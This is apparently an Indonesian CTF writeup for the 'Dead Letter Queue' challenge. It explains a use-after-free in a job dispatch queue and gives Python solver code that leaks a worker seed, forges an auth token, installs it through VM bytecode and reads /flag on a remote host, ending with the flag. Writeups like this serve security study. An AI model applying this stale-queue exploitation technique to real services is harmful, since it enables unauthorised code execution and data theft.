# Dead Letter Queue — Writeup

## Flag

```text
ASIS{5bde7fad6ec7676208a5d225f4230997ef81f0af}
```

## Ringkasan

Challenge ini berisi service `Dead Letter Queue` dengan tiga binary utama:

```text
relay
warden
worker
```

`relay` bertugas sebagai service TCP/protokol packet, `warden` sebagai validator, dan `worker` sebagai executor job.

Bug utamanya ada di mekanisme queue/ring buffer. Job yang sudah masuk antrean dispatch masih bisa di-`free`, lalu slot yang sama bisa dipakai ulang untuk job baru. Akibatnya, dispatch queue masih menyimpan referensi lama, tetapi isi slot sudah berubah menjadi payload attacker.

Exploit chain:

```text
fill queue pakai job benign valid
free salah satu job yang sudah queued
allocate job baru di slot yang sama
isi payload worker/VM
dispatch stale queue entry
leak worker seed
hitung auth token /flag
install token ke global secret worker
read /flag
```

## Recon

Isi archive challenge:

```bash
file relay warden worker
```

Ketiganya adalah ELF 64-bit PIE stripped.

Dari `strings worker`, terlihat beberapa string penting:

```text
/dev/urandom
flag
/flag
```

Jadi target akhirnya bukan shell, tapi membuat `worker` menjalankan jalur internal untuk membuka `/flag`.

## Protokol Packet

Service memakai packet biner custom dengan header 16 byte:

```python
struct.pack("<HBBIHHI", magic, op, code, ident, length, x, checksum)
```

Nilai `magic`:

```text
0x5144
```

Checksum menggunakan CRC32 custom terhadap 12 byte pertama header dan data:

```python
def checksum(hdr12, data=b""):
    a = crc32_custom(hdr12)
    if data:
        d = crc32_custom(data)
        d = ((d << 1) | (d >> 31)) & 0xffffffff
        a ^= d
    return a ^ 0x0c806284
```

Operasi queue yang dipakai:

```text
Q   allocate job
,   write payload ke job
(   prepare/validate job
g   enqueue job ke dispatch queue
W   free job
D   dispatch/execute job
```

## Vulnerability

Flow normal job:

```text
Q -> , -> ( -> g -> D
```

Masalahnya, job yang sudah masuk dispatch queue masih bisa dihapus dengan `W`.

Setelah job dihapus, `Q` berikutnya bisa mengembalikan slot yang sama. Namun entry lama di dispatch queue tidak ikut dibersihkan. Saat `D` dipanggil, service tetap mengeksekusi entry stale tersebut, tetapi isi slotnya sudah berubah menjadi payload baru.

Primitive exploit:

```python
def queue_worker_exec(s, payload):
    tids = []

    for _ in range(6):
        _, code, tid, _, _ = send(s, ord("Q"))
        tids.append(tid)
        send(s, ord(","), tid, benign_payload())
        send(s, ord("("), tid)
        send(s, ord("g"), tid)

    send(s, ord("W"), tids[0])

    _, code, evil_tid, _, _ = send(s, ord("Q"))
    send(s, ord(","), evil_tid, payload)

    _, code, _, _, data = send(s, ord("D"))
    return data
```

Payload benign memakai command worker `0x69`, karena command ini diterima oleh jalur queue normal.

## Worker VM

Worker punya command khusus:

```text
payload[0] = 0x92
```

Command ini menjalankan VM kecil. Format payload VM:

```text
offset 0x00 = 0x92
offset 0x01 = panjang bytecode
offset 0x08 = bytecode dword little-endian
```

Program VM diawali magic:

```text
0xee3575b7
```

Helper solver:

```python
def vm_payload(dwords):
    p = bytearray(0x70)
    p[0] = 0x92
    p[1] = len(dwords) * 4
    for i, x in enumerate(dwords):
        struct.pack_into("<I", p, 8 + i * 4, x & 0xffffffff)
    return bytes(p)
```

Opcode penting:

```text
0xB9  leak nilai internal worker berdasarkan index
0x59  set high 32-bit register
0xCA  set low 32-bit register
0x96  simpan register ke global secret
0x00  halt
```

## Leak Worker Seed

Program VM untuk leak seed:

```python
vm_payload([
    0xee3575b7,
    0xb9, 0,
])
```

Output remote:

```text
[+] leaked worker seed: 0x64d662caba44bab6
```

Seed ini dipakai worker untuk menghitung autentikasi command `/flag`.

## Menghitung Auth Token

Command flag-read worker:

```text
payload[0] = 0xad
payload[1] = len(path)
payload[4:8] = check32
payload[8:] = path
```

Path target:

```text
/flag
```

Worker tidak langsung membaca file tersebut. Ia mengecek token dan checksum internal berdasarkan seed dan path. Solver mengimplementasikan ulang mixer tersebut:

```python
def auth_values(worker_seed):
    data = b"/flag" + b"\x00" * (0x68 - 5)

    rcx = (((0xAD << 56) | (5 << 48)) ^ worker_seed ^ 0x7B98A97884FA1989) & MASK
    for i, b in enumerate(data):
        v = (b + i + 0x31EBD2704002B967) & MASK
        rcx ^= v
        x = rcx
        x ^= x >> 30
        x = (x * 0xBF58476D1CE4E5B9) & MASK
        x ^= x >> 27
        x = (x * 0x94D049BB133111EB) & MASK
        x ^= x >> 31
        rcx = rol64(x, i + 9)

    token = fmix64(rcx ^ 0x4154544143484D45)
    z = fmix64(token ^ 0x54575F3A17BC3EBC)
    check32 = ((z & 0xFFFFFFFF) ^ (z >> 32)) & 0xFFFFFFFF
    return token, check32
```

Untuk seed remote, token yang didapat:

```text
[+] computed auth token: 0xe07de8865ade60c7
```

## Install Token ke Worker

Token 64-bit harus dipasang ke global secret worker. Caranya lewat VM:

```python
def make_set_secret_payload(token):
    lo = token & 0xffffffff
    hi = token >> 32

    return vm_payload([
        0xee3575b7,
        0x59, 0, hi,
        0xca, 0, lo,
        0x96, 0,
        0x00,
    ])
```

Payload ini dieksekusi memakai bug stale queue entry yang sama.

## Read Flag

Setelah token terpasang, buat payload command `0xad`:

```python
def make_flag_payload(check32):
    p = bytearray(0x70)
    p[0] = 0xad
    p[1] = 5
    struct.pack_into("<I", p, 4, check32)
    p[8:13] = b"/flag"
    return bytes(p)
```

Payload ini dikirim ke worker, lalu worker membuka `/flag` dan mengembalikan isinya.

## Solver Usage

```bash
python3 solve.py 91.107.187.160 18111
```

Output:

```text
[+] leaked worker seed: 0x64d662caba44bab6
[+] computed auth token: 0xe07de8865ade60c7

[+] installed auth token in worker
ASIS{5bde7fad6ec7676208a5d225f4230997ef81f0af}
<FLAG>ASIS{5bde7fad6ec7676208a5d225f4230997ef81f0af}</FLAG>
```
